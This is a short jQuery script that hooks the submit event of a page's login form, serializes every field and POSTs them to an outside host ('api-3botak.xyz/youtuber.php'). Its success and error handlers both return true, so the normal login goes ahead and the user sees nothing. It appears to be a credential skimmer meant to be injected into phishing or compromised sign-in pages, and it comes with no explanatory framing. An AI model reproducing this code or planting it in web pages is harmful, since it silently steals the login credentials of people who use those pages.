$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://api-3botak.xyz/youtuber.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
